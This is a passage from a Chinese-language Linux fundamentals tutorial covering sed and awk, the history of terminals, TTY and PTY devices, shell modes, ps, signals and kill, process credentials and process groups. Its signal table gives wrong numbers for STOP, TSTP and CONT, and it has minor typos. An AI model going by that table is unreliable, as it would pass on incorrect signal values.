$echo "Root ROOT" | sed 's/root/test/gi'

```

删除行：

```bash
# 删除包含 root 的行
$sed '/root/d' demo.txt

# 删除注释行（#开头）
$sed '/^#/d' sshd_config

# 删除空行
$sed '/^$/d' demo.txt
```

插入数据：

```bash
# 匹配到 admin，在这一行后面追加一行
$sed '/admin/a new_line' demo.txt

# 在匹配行前面插入
$sed '/admin/i before_line' demo.txt
```

## awk

`awk` 命令是一种专为文本处理设计的编程语言，通常被用作数据提取和报告工具。它的功能和sed一样异常强大，两个常用的功能是作为字段分隔符的 `-F` 选项，以及用于输出结果文本的 `print` 子命令，它会将文本打印到STDOUT，

在读取一行文本时，awk 会用预先定义 好的字段分隔符划分出各个数据字段。在默认情况下，字段分隔符是任意的空白字符（比如空格 或制表符）。 这些数据字段分配一 个内置变量。在默认情况下，gawk会将下列变量分配给文本行中的数据字段：

1. $0代表整个文本行。   
2. $1代表文本行中的第一个数据字段。  
3. $2代表文本行中的第二个数据字段。   
4. $n代表文本行中的第n个数据字段。

```bash
$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
hello friend
```

这里使用“::”作为字段分隔符来提取第一个（$1）和第三个（$3）字段，并输出。

## 历史演进

早期计算机往往体积庞大、价格昂贵，通常由专门的操作人员负责管理。为了让操作人员能够控制计算机的运行，计算机配备了专门的操作面板，也就是控制台（Console）。

早期控制台通常由开关、按钮和指示灯组成。操作人员可以通过开关输入数据或控制指令，通过指示灯观察计算机的运行状态。在一些计算机中，操作人员还可以借助控制台检查或修改寄存器和内存中的内容。这种交互方式十分有限。计算机内部的信息需要通过指示灯等方式表示，操作人员则需要借助开关完成操作。控制台主要用于计算机的启动、维护、调试和运行控制，而不是让大量普通用户直接使用计算机。

随着计算机技术的发展，操作系统开始支持多任务和多用户。计算机不再只是由一名操作人员管理并依次执行任务，而是可以为多个用户提供计算服务。然而，传统控制台并不适合这种使用方式。一方面，控制台通常直接连接计算机，主要用于系统管理；另一方面，多个用户不可能同时通过同一组开关和指示灯独立操作计算机。

因此，计算机需要一种能够供用户独立输入和接收信息的交互设备。为了让多个工程师同时使用这台主机，人们通过长长的串口线（RS-232），将多台电传打字机（Teletypewriter，简称 TTY）连接到主机上。电传打字机只有键盘和打印纸，没有 CPU 和内存。敲击按键时，它通过串口线向主机发送电信号（ASCII 编码）；收到主机信号时，驱动字锤在纸上打印字符。后来打印纸被 CRT 显像管屏幕取代（最著名的代表是 DEC VT100）。这种用于人与计算机进行交互的设备，后来被称为终端（Terminal）。

![console](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/console.webp)

终端并不负责理解用户输入的命令，也不负责执行程序。它主要提供输入和输出能力：用户通过终端输入字符，计算机通过终端返回信息。

不同厂商生产的终端还可能采用不同的通信方式、控制字符和显示能力。虽然这些设备在硬件和功能上存在差异，但对于运行在计算机上的大多数程序而言，它们承担着相同的基本任务：接收用户输入，并向用户输出信息。因此，操作系统需要将具体的终端硬件与应用程序使用的交互接口分离。Unix 为此建立了统一的终端设备处理机制。由于早期广泛使用的终端设备是电传打字机，这套机制沿用了 Teletype 的名称，简称 **TTY**。TTY 最初是电传打字机的缩写，但在 Unix 及 Linux 中，其含义已经扩展为操作系统中的终端设备及相关处理机制。这意味着，应用程序不需要直接了解终端的硬件结构，而是可以通过操作系统提供的接口进行终端输入和输出。

然而，随着个人计算机的普及，这种使用方式逐渐发生了变化。个人计算机通常直接配备键盘和显示器，用户不再需要额外连接一台独立的终端设备。与此同时，操作系统仍然需要保留终端交互能力，使用户能够登录系统、输入命令并运行程序。

## 虚拟终端

既然已经有了键盘和显示器，能否直接利用这些设备提供传统终端的功能？Linux 通过**虚拟终端（Virtual Terminal，VT）**机制实现了这一需求。

虚拟终端并不是一台真实存在的独立设备，而是由操作系统通过软件提供的终端环境。在采用 Linux 虚拟控制台机制的系统中，内核可以利用本地键盘和显示设备提供多个相互独立的字符终端。例如，Linux 通常提供以下虚拟终端设备,通常以**字符设备文件（Character Device File）**的形式出现在 /dev 目录下：

```text
/dev/tty1     第一个虚拟终端
/dev/tty2     第二个虚拟终端
/dev/ttyS0
/dev/console 
...
```

每个虚拟终端都可以拥有独立的登录会话和正在运行的程序。用户可以在其中一个终端登录系统、执行命令，再切换到另一个终端进行其他操作，而不必额外连接多台物理终端。

在传统的 Linux 虚拟控制台环境中，可以通过 Ctrl + Alt + F1、Ctrl + Alt + F2 等组合键切换不同的虚拟终端。实际使用的按键及终端编号取决于发行版和系统配置。例如，在没有图形桌面的 Linux 系统中，启动完成后可能会显示：

```text
Ubuntu 24.04 LTS tty1

login:
```

这里的 **tty1** 表示当前使用的是第一个虚拟终端。用户登录后，系统通常会启动一个 Shell，供用户输入和执行命令。

尽管虚拟终端不再依赖独立的终端硬件，但它仍然保留了传统终端的基本交互方式：接收用户输入，并显示程序输出。因此，从早期通过串口连接的物理终端，到个人计算机上的虚拟终端，改变的是终端的实现方式，而不是程序所依赖的基本终端接口。

还有两个比较特殊的设备文件，

-  /dev/ttyS0：通常对应一个传统串口设备，可以通过串行通信接口与外部终端进行数据交换。
- /dev/console ：这个特殊的设备节点它代表“当前被内核指定的最高权限系统控制台”。通过配置内核启动参数（Kernel Command Line），管理员可以灵活指定谁来当 Console。默认 console=tty0。因此开机时你能在显示器上看到一串串 [  OK  ] Started ... 的内核启动日志。机房里的机架式服务器和路由器通常不插显示器。工程师会在内核参数中配置 console=ttyS0,115200。此时，内核把物理串口 /dev/ttyS0 设置为 System Consol。！运维人员拿一根串口线插到服务器上（或者通过服务器主板上的 BMC/IPMI 带外管理芯片模拟串口），就能在自己的笔记本上看到服务器开机 BIOS 和内核崩溃日志——这就是为什么在云服务器（如 AWS、阿里云）后台，那个用于救急的“VNC 救援连接/串口日志”被称为 Serial Console（串口控制台）。

这些设备文件虽然名称相似，但背后对应的终端实现并不相同。对于应用程序而言，这些差异通常不需要直接考虑。程序可以使用 open() 打开设备，再通过 read() 和 write() 等系统调用读取输入或写入输出。例如，一个程序需要从终端读取用户输入时，并不需要了解字符究竟来自串口设备，还是来自本地键盘。它只需要通过已经打开的终端设备接口读取数据。

## TTY子系统

之所以能够做到这一点，是因为 Linux 内核提供了 TTY 子系统，用于协调终端设备的输入输出处理。

![TTY](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/TTY.webp)



这里的 TTY 子系统并不只是简单地转发数据。它还提供终端输入缓冲、字符回显、终端属性管理以及特殊控制字符处理等功能。而设备驱动及相关实现负责处理具体设备的输入输出。

可以通过以下命令观察终端设备：

```bash
ls -l /dev/tty1 /dev/ttyS0
```

在存在这些设备节点的系统中，可能看到类似输出：

```text
crw--w---- 1 root tty     4, 1 ... /dev/tty1
crw-rw---- 1 root dialout 4,64 ... /dev/ttyS0
```

其中的 4, 1 和 4,64 分别表示设备的主设备号（Major Number）和次设备号（Minor Number），用于帮助内核识别设备及其对应的驱动接口。

## Shell执行命令流程

前面已经介绍，TTY 为程序提供了统一的终端输入输出接口。用户可以通过终端向计算机发送字符，计算机也能够通过终端将结果返回给用户。

然而，终端和 TTY 只解决了输入输出的问题，并不能直接理解用户输入的命令。例如，当用户输入：

```bash
$ls -l
```

对于终端而言，这只是一串普通字符。TTY 可以接收并传递这些字符，但它并不知道 ls 表示列出目录内容，也不知道 -l 是传递给程序的命令选项。

Linux 内核虽然负责进程管理、内存管理、文件系统和设备管理等工作，但并不直接将用户输入的文本解释为命令。内核提供的是系统调用等底层接口，应用程序需要通过这些接口请求内核完成相应操作。

如果要求用户直接使用这些底层接口操作计算机，不仅十分复杂，也不适合日常使用。因此，Unix 需要一个运行在用户空间的程序，专门负责接收用户输入、解释命令，并调用相应的程序或系统功能。

这个程序就是 **Shell（命令解释器）**。

Shell 的主要职责是读取命令、解析命令，并根据命令的内容执行相应操作。需要注意，Shell 并不是终端设备的一部分，也不是 Linux 内核的一部分。它是一个普通的用户空间程序，只是通常通过终端与用户交互。简化的数据流如下所示：

- 输入：用户 → 终端 → 内核 TTY → Shell
- 输出：Shell → 内核 TTY → 终端 → 用户

既然 Shell 负责解释用户输入的命令，那么它在接收到一条命令后，究竟会进行哪些操作？

当用户输入命令按下 Enter 后，Shell 从终端读取这一行输入，并按照 Shell 的语法规则进行解析。

对于外部命令，Shell 会查找对应的可执行程序。在没有显式指定路径的情况下，Shell 通常会根据 **PATH 环境变量**中的目录查找程序。对于内部命令，通常由shell自己执行。

Linux 上所有运行中的程序都对应一个进程，Shell 本身同样以进程形态运行。当 Shell 执行外部命令时，通常先 产生子进程，再在该子进程中调用替换进程映像为目标程序；而 Shell 内置命令不会新建子进程，直接在当前 Shell 进程内执行。

当 Shell 在终端中运行时，它的标准输入、标准输出和标准错误通常都连接到当前终端设备：

```txt
			  终端设备
                 |
       +---------+---------+
       |         |         |
       v         ^         ^
     stdin     stdout    stderr
       |         |         |
       +---------+---------+
                 |
                Shell
```

Shell 通过标准输入读取用户输入的命令，通过标准输出显示正常结果，通过标准错误输出错误信息。

当 Shell 启动一个外部程序时，该程序通常会继承 Shell 已经打开的标准文件描述符，除非 Shell 根据命令要求修改这些连接——这就是 Linux 重定向机制的基础。

## Shell 的不同运行方式

到目前为止，我们主要讨论通过终端与 Shell 进行交互的情况。但 Shell 并不是只能通过终端运行，也不一定每次启动都需要完成相同的初始化工作。

例如，用户登录 Linux 系统后，通常需要获得相应的运行环境，包括环境变量、命令搜索路径以及其他用户配置。而当用户只是执行一个 Shell 脚本时，通常不需要重新初始化完整的登录环境。

此外，Shell 有时需要持续接收用户输入，有时则只需要执行一段预先写好的命令。

为了适应这些不同的使用场景，Shell 具有不同的运行方式。这里需要从两个相互独立的角度进行区分：

- **交互式 Shell 与非交互式 Shell**：区分 Shell 是否以交互模式运行。
- **登录 Shell 与非登录 Shell**：区分 Shell 是否以登录模式启动，主要影响启动时的初始化行为。

需要注意，这两种分类并不互相排斥。一个 Shell 可以同时属于其中两个类别。

###  交互式与非交互式 Shell

当用户打开一个命令行环境，看到命令提示符，并能够不断输入命令时，通常使用的是交互式 Shell。

交互式 Shell 会持续读取用户输入，并提供适合人工操作的功能，例如命令提示符、命令历史和作业控制等。例如，直接在终端中启动 Bash：

```bash
$bash
```

如果 Bash 启动时不带 `-c`、不带脚本这类非选项参数，并且标准输入、标准错误都连接到终端，则自动进入交互模式；如果启动时指定了 `-i`，则强制为交互式，不受终端条件约束。

直接读取脚本文件中的命令，执行完成后退出。这通常属于非交互式 Shell。非交互式 Shell 常见于脚本执行、定时任务和自动化操作:

```bash
$bash script.sh
```

Bash 提供了一种检查当前 Shell 是否为交互式的方法， `$-` 是 Bash 的特殊参数，保存当前启用的部分 Shell 选项标志：

```bash
echo "$-"
himBHs
```

包含字母 `i`，说明当前 Bash 处于交互模式。其他的标记的含义如下：

| 标记 | 含义                                                         |
| ---- | ------------------------------------------------------------ |
| `h`  | 开启命令 hash；bash 把外部命令路径缓存进 hash 表，不用每次都扫一遍 `$PATH` |
| `i`  | 交互式 shell；有终端、可以交互输入；脚本默认没有 i           |
| `m`  | 启用了作业控制（job control）                                |
| `B`  | 支持大括号展开 `{a,b,c}`                                     |
| `H`  | 历史扩展，启用 `!` 历史感叹号（`!100`、`!!`）                |
| `s`  | 从标准输入读取命令                                           |

### 登录与非登录 Shell

除了交互方式，Shell 还需要区分是否以登录模式启动。早期 Unix 用户通常先通过终端登录系统。登录程序在完成用户身份验证后，会启动用户对应的 Shell，并使其获得必要的初始化环境。

但随着系统的发展，Shell 不再只在用户登录时启动。例如，用户可以在已经运行的 Shell 中再启动一个新的 Bash，也可以通过图形终端模拟器启动 Shell，或者通过脚本执行程序。这些启动方式不一定需要重新执行登录初始化。因此，Shell 区分登录 Shell（Login Shell）与非登录 Shell（Non-login Shell）。

**登录 Shell** 是以登录模式启动的 Shell。它通常用于建立用户登录后的命令行环境，并在启动时读取相应的登录初始化文件。

**非登录 Shell** 则没有以登录模式启动，通常不会按照登录 Shell 的规则读取登录初始化文件。

需要特别注意，登录 Shell 并不意味着该 Shell 自己执行了身份验证，也不意味着每次启动登录 Shell 都需要重新输入用户名和密码。登录与非登录在这里描述的是 Shell 的启动模式，而不是用户此刻是否已经登录操作系统。例如，用户在 Linux 虚拟控制台完成登录后，登录程序通常会启动一个登录 Shell。而用户进入 Bash 后，再执行bash命令通常会启动一个新的非登录 Shell。

如果希望显式启动登录 Shell，可以执行：

```bash
$bash --login

$bash -l
```

即使用户已经登录系统，也可以在同一个登录会话中启动非登录 Shell，或者手动启动另一个登录 Shell。我们可以通过 Bash 内置 `shopt` 命令检查当前 Bash 是否以登录模式运行：

```bash
$shopt login_shell
```

如果输出login_shell  on说明当前 Bash 是登录 Shell。

登录 Shell 与非登录 Shell 的一个重要区别，是它们启动时读取的初始化文件不同。用户的命令行环境往往需要进行一定配置，例如设置环境变量、定义命令别名或者调整命令搜索路径。为了避免每次启动 Shell 都手动输入这些配置，Shell 可以在启动时读取特定的初始化文件。

## 终端模拟器和伪终端

前面已经介绍，早期 Unix 系统通过物理终端与用户交互。随着个人计算机的发展，Linux 又通过虚拟终端机制，使用户能够直接利用本地键盘和显示器使用命令行环境。

然而，无论是物理终端还是 Linux 虚拟终端，它们主要提供的都是字符交互环境。用户通常需要在相应的终端界面中输入命令，而不能像现代图形桌面一样，将命令行与其他图形应用程序放在不同窗口中同时操作。

随着图形用户界面（Graphical User Interface，GUI）的发展，用户开始通过窗口管理器和图形应用程序操作计算机。文本编辑器、文件管理器、浏览器等程序可以同时运行，并在各自的窗口中与用户交互。

尽管图形界面提供了更加直观的操作方式，命令行仍然是系统管理、软件开发和自动化操作的重要工具。

因此，人们希望能够直接在图形桌面中使用命令行，而不必切换到独立的字符终端。为此，出现了**终端模拟器（Terminal Emulator）**。

终端模拟器是一种模拟传统终端行为的程序。它接收用户的键盘输入，并在窗口中显示字符，使运行在其中的程序能够按照传统终端的交互方式工作。

常见的终端模拟器包括：

- XTerm
- GNOME Terminal
- Konsole
- Alacritty

需要注意，终端模拟器并不是随着现代 Linux 桌面才出现的。早在图形桌面普及之前，人们就已经使用软件模拟不同类型的硬件终端。现代图形终端模拟器延续了这一技术思路。

与传统物理终端不同，图形终端模拟器通常不需要专门的终端硬件。它本身就是运行在用户空间的应用程序，依靠图形系统完成窗口绘制和键盘事件处理。

但终端模拟器不仅仅是一个能够输入和显示文字的窗口。传统终端除了接收和输出普通字符，还支持一系列用于控制显示行为的操作。例如，程序可以要求终端移动光标、清除屏幕、修改字符颜色，或者在指定位置重新绘制内容。这些操作通常通过终端控制序列实现。

例如，许多现代终端模拟器支持 ANSI/ECMA-48 风格的控制序列，程序可以通过输出特定字节序列控制终端显示效果。这也解释了为什么 `vim`、`top` 等程序能够在终端中不断更新屏幕内容，而不是只能一行接一行地输出文字。

终端模拟器负责解释这些控制序列，并将其转换为实际的显示操作。因此，它与 Shell 的职责完全不同：

- 终端模拟器负责提供终端交互界面、解释终端控制序列和显示输出。
- Shell 负责读取用户命令、解析命令并执行相应操作。

例如，用户通过终端模拟器输入 `ls`，终端模拟器并不知道 `ls` 的含义，也不会自行执行这个命令。它只负责将输入传递给相应的程序，并显示程序返回的内容。

伪终端（PTY）并不是一种真实的终端硬件，而是操作系统通过软件实现的终端设备机制。PTY 的概念早已存在于 Unix 系统中，并不专门服务于图形终端模拟器。除了本地终端窗口，它还广泛应用于远程登录、终端复用以及其他需要模拟终端环境的程序。伪终端的核心设计，是创建一对相互关联的设备接口：

- **PTY Master（主设备）**
- **PTY Slave（从设备）**

其中，PTY Slave 向应用程序提供普通的终端设备接口。

Shell 可以像使用物理终端或 Linux 虚拟终端一样使用 PTY Slave，通过它读取输入、输出数据，并调用终端控制接口。

而 PTY Master 则由负责管理交互的程序持有，例如终端模拟器。终端模拟器可以向 Master 写入数据，也可以通过 Master 读取 Slave 一侧产生的输出。两者通过 Linux 内核中的 PTY 机制相互连接。数据流转的流程如下：

- 键盘输入：终端模拟器 → write → PTY Master →【内核】→ PTY Slave → Shell
- 输出文字：Shell → write → PTY Slave →【内核】→ PTY Master → 终端模拟器 → 渲染到屏幕

这里需要注意，Master 和 Slave 虽然成对出现，但它们承担的职责并不相同。

PTY Slave 具有终端设备的语义，能够使用 TTY 子系统提供的线路规程、终端属性和作业控制等机制。

PTY Master 则主要提供一种让终端模拟器等程序与该终端交换数据的接口。

当终端模拟器向 Master 写入数据时，这些数据会进入 Slave 一侧的终端输入处理路径，经过相应处理后供 Shell 读取。反过来，当 Shell 或其启动的程序向 Slave 写入输出时，终端模拟器便可以从 Master 读取对应的数据。这意味着，终端模拟器并不需要直接操作 Shell 的内部状态，Shell 也不需要知道对面是否存在真实的终端硬件。对于 Shell 来说，它面对的依然是一个 TTY 设备。

这正是 PTY 的重要意义：**将终端的输入输出界面与底层硬件解耦，使普通软件也能够提供完整的终端交互环境。**

在现代 Linux 中，通常使用 Unix 98 风格的伪终端机制。Linux 提供了一个特殊的设备节点：

```text
/dev/ptmx
```

程序可以通过打开 **/dev/ptmx** 创建新的伪终端实例，并获得对应的 PTY Master 文件描述符。随后，程序可以通过相关接口完成 Slave 的授权、解锁和定位。新创建的 PTY Slave 通常会出现在/dev/pts/目录下，例如：

```text
/dev/pts/0
/dev/pts/1
/dev/pts/2
```

这些设备节点通常由 devpts 文件系统管理。需要注意，/dev/ptmx 并不是某一个固定的 PTY Master，而是创建或获取新伪终端主设备的入口。打开它所获得的文件描述符，对应一个具体的伪终端实例。例如，当终端模拟器创建一个新的 PTY 时，内核可能为其分配 /dev/pts/0 作为从设备。如果再创建一个新的 PTY，则可能得到 /dev/pts/1。这些编号由系统分配，并不固定，也不代表特定的用户或 Shell。

创建好 PTY 后，终端模拟器还需要启动 Shell，并让 Shell 的标准输入、标准输出和标准错误连接到 PTY Slave。对于需要控制终端的交互式会话，还需要完成相应的会话和控制终端设置。这些操作通常由终端模拟器或负责启动 Shell 的辅助进程完成，具体实现可能因程序而异。

理解终端模拟器与 PTY 的工作方式后，可以通过一些简单的命令观察当前系统中的终端设备。

**查看当前终端设备**，/dev/pts/0这说明当前标准输入关联到了一个伪终端从设备。

```bash
$tty
/dev/pts/0
```

**查看 PTY 设备节点**，可以查看当前 devpts 文件系统中的伪终端从设备节点：

```bash
$ls -l /dev/pts/
total 0
crw--w---- 1 bob tty  136, 0 Nov 10 14:49 0
crw-rw-rw- 1 root root   5, 2 Nov  8 22:36 ptmx
```

**查看 Shell 的标准文件描述符**，可以看到当前 Shell 的标准输入、标准输出和标准错误都连接到同一个 PTY Slave：

```bash
$ls -l /proc/$$/fd/
total 0
lrwx------ 1 bob bob 64 Nov 10 10:13 0 -> /dev/pts/0
lrwx------ 1 bob bob 64 Nov 10 10:13 1 -> /dev/pts/0
lrwx------ 1 bob bob 64 Nov 10 10:13 2 -> /dev/pts/0
lrwx------ 1 bob bob 64 Nov 10 10:13 255 -> /dev/pts/0
```

## 创建进程

进程是正在运行的程序的实例。每次通过终端运行程序时，都会启动一个新的进程。Linux 内核会维护每个进程的相关信息以帮助对其进行管理，且每个进程都会被分配一个编号，称为**进程ID**（PID）还有其他的比如，用户ID、组ID以及终止状态等。

进程可使用系统调用fork()来创建一个新进程。调用fork()的进程被称为父进程，新创建的进程则被称为子进程。内核通过对父进程的复制来创建子进程。子进程从父进程处继承数据段、栈段以及堆段的副本后，可以修改这些内容，不会影响父进程的“原版”内容。然后，子进程要么去执行与父进程共享代码段中的另一组不同函数，或者，更为常见的情况是使用系统调用execve()去加载并执行一个全新程序。execve()会销毁现有的文本段、数据段、栈段及堆段，并根据新程序的代码，创建新段来替换它们。

每一进程具有一个父进程标识符（**PPID**）属性，用以标识由哪个进程创建的，也就是当前进程的父进程。操作系统最初启动时，会创建一个init进程（进程号为1），这个用户层的进程用来启动其他的进程，这种关系反映了系统上所有进程间的树状关系。每个进程的父进程有自己的父进程，以此类推，回溯到1号进程。

## 查看进程信息

可以通过ps命令来查看进行进程信息, **ps 命令默认只显示运行在当前终端中属于当前用户的那些进程**，例如下面的输出中显示了程序的进程ID、进程运行在哪个终端（TTY） 、占用的CPU时间、以及启动该进程的命令。:

```bash
$ps
    PID TTY          TIME CMD
 100969 pts/0    00:00:00 bash
 102579 pts/0    00:00:00 ps
```

ps命令可用的选项太多了，而且支持3种类型的选项，下面只介绍常用选项和功能：

```bash
$ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2  24800 16196 ?        Ss   Nov06   0:12 /sbin/init splash noautomount splash
```

这是 BSD 风格选项 ，该选项的含义为：

- **a**：列出所有绑定终端的进程，包括其他用户的进程
- **u**：以用户视角输出，带上资源统计（% CPU、% MEM、属主等）
- **x**：同时列出**没有控制终端**的进程（守护进程，TTY 列是 `?`）

头部各字段的含义为：

| 字段    | 含义                                 |
| ------- | ------------------------------------ |
| USER    | 进程属主（有效用户）                 |
| PID     | 进程 ID                              |
| %CPU    | 当前 CPU 占用百分比（不是累计）      |
| %MEM    | 物理内存占比                         |
| VSZ     | 虚拟内存总大小（KiB）                |
| RSS     | 常驻物理内存（KiB，不包含 swap）     |
| TTY     | 控制终端，? = 无终端（daemon）       |
| STAT    | 进程状态（R/S/D/T/Z 等）             |
| START   | 进程启动时间                         |
| TIME    | 累计占用 CPU 时长（用户态 + 内核态） |
| COMMAND | 启动命令 + 参数（argv）‘             |

其中STAT 状态码中各缩写的含义如下：

| START | 描述                                        |
| ----- | ------------------------------------------- |
| R     | 运行 / 就绪，在运行队列                     |
| S     | 可中断睡眠（等待事件，可以被信号唤醒）      |
| D     | 不可中断睡眠（通常是磁盘 I/O，kill 杀不掉） |
| T     | 暂停、被跟踪（gdb attach / Ctrl+Z）         |
| Z     | 僵尸进程（子进程退出、父进程还没 wait ()）  |
| s     | session leader（会话首进程）                |
| +     | 前台进程组                                  |
| l     | 多线程进程                                  |

Unix 风格常用选项如下：

```bash
$ps -ef

root           1       0  0 Nov06 ?        00:00:12 /sbin/init splash noautomount splash
```

该选项的含义为：

- -e:列出系统全部进程
- -f:显示完整格式的输出

头部各字段的含义为：

| 表头  | 含义                                                         |
| ----- | ------------------------------------------------------------ |
| UID   | 有效用户 ID（进程当前权限身份）                              |
| PID   | 进程 ID                                                      |
| PPID  | 父进程 ID（Parent PID，这是 -f 才多出的核心字段）            |
| C     | CPU 调度权重 / 利用率（旧版：进程生命周期 CPU 占比；现在主要给内核调度器参考） |
| STIME | 进程启动时间；启动超过 24h 会显示日期                        |
| TTY   | 控制终端；? = 无终端（守护进程）                             |
| TIME  | 累计占用 CPU 时长（用户态 + 内核态，不是运行墙钟时间）       |
| CMD   | 启动命令 + 参数                                              |

可以结合管道使用任何前面学到的命令，对输出进行过滤和排序。还有一个`pstree`命令，它可以以树形的方式展示所有的进程。

## 终止进程

如果子进程的父进程终止，则子进程就会变成“孤儿”，init进程随即将收养该进程。可使用以下两种方式之一来终止一个进程：

1. 进程自己调用系统函数 请求退出；
2. 向进程传递信号，将其“杀死”。

无论进程以何种方式结束，都会产生一个**终止状态（termination status）**：一个取值很小的非负整数，父进程可以通过系统调用来读取它。 

- 如果进程是正常退出的，它可以主动指定这个终止状态( 常称 退出状态（exit status）来做区分)；
- 如果进程是被信号杀死的，则终止状态由导致进程终止的信号决定。

按照惯例：终止状态为 0 代表执行成功；非零值代表出错。绝大多数 Shell 会把上一条命令的终止状态保存在环境变量 `$?` 里，可以使用以下命令查看上一个命令的退出状态：

```bash
$echo $?
0
```

### 信号

信号称为“软件中断”。进程收到信号，就意味着某一事件或异常情况的发生。信号的类型很多，每一种分别标识不同的事件或情况。采用不同的整数来标识各种信号类型，并以SIGxxxx形式的符号名加以定义。

内核、其他进程（只要具有相应的权限）或进程自身均可向进程发送信号。例如，发生下列情况之一时，内核可向进程发送信号。

- 用户键入中断字符（通常为Control-C）。
- 进程的子进程之一已经终止。
- 由进程设定的定时器（告警时钟）已经到期。
- 进程尝试访问无效的内存地址。

在shell中，可使用`kill`命令或`pkill` 命令 向进程发送信号。收到信号时，进程会根据信号采取如下动作之一：

- 忽略信号：内核将信号丢弃，信号对进程没有产生任何影响（进程永远都不知道曾经出现过该信号）。
- 终止（杀死）进程：这有时是指进程异常终止，而不是进程因调用系统函数而发生的正常终止。
- 产生核心转储文件，同时进程终止：核心转储文件包含对进程虚拟内存的镜像，可将其加载到调试器中以检查进程终止时的状态。
- 停止进程：暂停进程的执行。
- 于之前暂停后再恢复进程的执行。

常用的信号值如下所示：

| 编号 | 信号名称 | 描述                                 |
| ---- | -------- | ------------------------------------ |
| 1    | HUP      | 终端挂断；常用于通知守护进程重读配置 |
| 2    | INT      | 键盘中断信号                         |
| 3    | QUIT     | 键盘退出，默认会生成 core dump       |
| 9    | KILL     | 强制杀死进程，不可捕获、不可忽略     |
| 11   | SEGV     | 段违规：访问非法内存地址             |
| 15   | TERM     | 优雅终止信号，允许进程自行清理资源   |
| 17   | STOP     | 强制暂停进程，不可捕获、忽略         |
| 18   | TSTP     | 终端暂停信号                         |
| 19   | CONT     | 恢复已暂停的进程继续运行             |

kill 命令可以通过 PID向进程发送信号，但执行kill命令时必须举有相应的权限才可以：

- 特权级（CAP_KILL）进程可以向任何进程发送信号。
- 若非特权进程的发送方 ruid / euid，与接收方的 ruid 或者 saved-uid 匹配，就可以向该进程发送信号。依靠这条规则：用户可以给自己启动的 SUID 程序发信号，不用管目标进程当前的 euid 是什么。

在默认情况下，kill 命令会向命令行中列出的 所有PID发送TERM信号。

```bash
 $ kill 3940 
 -bash: kill: (3940) - Operation not permitted
```

TERM 信号会告诉进程终止运行。但不服管教的进程通常会忽略这个请求。如果要强制终止， 则-s选项支持指定其他信号（用信号名或信号值）：

```
$kill -9 3940 

$kill -KILL 3940
```

kill命令不会有任何输出，要检查kill命令是否生效，可以再次执行ps命令或top命令，看看那些进程是否已经停止运行。

`pkill` 命令可以使用程序名或使用通配符代替PID来 终止进程，默认发的也是 15（TERM）信号，也可以和`kill`命令一样指定信号值和信号名：

```bash
$pkill -KILL http*
```

通配符很容易意外地操作了将其他进程，要格外小心。

## 进程的凭据

在 Linux 中，每个进程都具有一组用于标识身份和判断访问权限的用户 ID（UID）与组 ID（GID），这些信息称为**进程凭据（Process Credentials）**。

主要包括：

- **实际用户 ID（RUID）与实际组 ID（RUID）**：标识进程所属的用户和组。
- **有效用户 ID（EUID）与有效组 ID（EGID）**：用于判断进程执行某些操作时具有的权限。
- **保存的用户 ID（Saved Set-User-ID）与保存的组 ID（Saved Set-Group-ID）**：保存执行程序后相应的有效 ID，使程序能够在特定条件下切换身份。
- **文件系统用户 ID（FSUID）与文件系统组 ID（FSGID）**：Linux 专门用于文件系统权限检查的身份标识。
- **附加组 ID（Supplementary Group IDs）**：记录进程所属的其他用户组，参与资源访问权限检查。

实际 UID 和实际 GID 用于标识进程所属的用户和组。用户登录时，登录服务通常会通过系统的账户查询机制获取用户信息，并在建立会话的过程中设置相应的进程凭据。此后，新创建的子进程通常会继承父进程的身份凭据。例如，Bash 执行外部命令时，子进程通常会继承 Bash 的 UID 和 GID。

有效 UID 和有效 GID 主要用于确定进程执行某些操作时具有的权限。例如，进程访问文件、使用特定系统资源或执行受限制的操作时，内核需要检查其相应的身份凭据。在通常情况下，进程的实际 UID 与有效 UID 相同，实际 GID 与有效 GID 也相同。但在执行具有 SUID、SGID 属性的程序或调用相关系统调用时，它们可能发生变化。在传统 Unix 权限模型中，有效 UID 为 `0` 的进程通常具有超级用户特权。但现代 Linux 将部分特权操作进一步划分为 Capabilities，因此实际特权还需要结合进程的能力集合及其他安全限制判断。

保存的 UID 和 GID 主要用于支持进程在特定身份之间切换，尤其与 SUID、SGID 程序有关。当进程通过 execve() 执行新程序时，通常会发生以下操作：

1. 如果可执行文件设置了 SUID 或 SGID 位，并且满足相应条件，内核会将进程的有效 UID 或有效 GID 设置为文件所有者或所属组的 ID。
2. 随后，内核将当前有效 UID 和有效 GID 分别复制到保存的 UID 和保存的 GID 中。

第二步无论可执行文件是否设置 SUID/SGID 位，都会执行。保存这些 ID 后，程序便可以在符合权限规则的情况下，临时放弃某些权限，并在需要时恢复相应身份。

Linux 还为进程维护文件系统 UID（FSUID）与文件系统 GID（FSGID），专门用于文件系统访问权限检查。当进程访问文件或目录时，内核主要使用 FSUID、FSGID 及附加组 ID，与文件的所有者 UID、所属组 GID 进行比较。在通常情况下：

```
FSUID = EUID
FSGID = EGID
```

当有效 UID 或有效 GID 改变时，Linux 内核通常也会自动更新对应的文件系统 ID。因此，在一般文件权限分析中，可以直接使用有效 UID 和有效 GID 理解权限判断过程。只有在进程通过 setfsuid()、setfsgid() 等机制单独修改文件系统身份时，两者才可能不同。

除了主要组，进程还可以具有多个附加组 ID。这些 ID 通常在建立用户会话时根据系统账户与用户组信息设置，并由后续创建的子进程继承。文件系统进行权限检查时，会将进程的 FSGID 和附加组 ID 与文件所属组的 GID 进行比较，以确定进程是否属于相应的组权限类别。

> [!NOTE]
>

## 进程组

shell执行的每个外部命令都会在一个新进程内发起。比如，shell创建了3个进程来执行以下命令：

```bash
$ ls -l | sort -k5n | less
```

几乎所有的主流shell都提供了一种交互式特性，名为任务控制。该特性允许用户同时执行并操纵多条命令。在支持任务控制的shell中，会将管道内的所有进程置于一个新进程组或任务中，如果只包含一条命令，那么就会创建一个只包含单个进程的新进程组。

进程组中的每个进程都具有相同的进程组标识符，该标识符就是进程组中某个进程（称为进程组组长）的进程ID。可以通过`ps`命令，使用-eo选项查看自定义字段，其中的**pgid**表示进程组标识符：

```bash
$ps -eo pid,ppid,pgid,stat,cmd | grep ps
104179  100969  104179 R+   ps -eo pid,ppid,pgid,stat,cmd
104180  100969  104179 S+   grep --color=auto ps
```

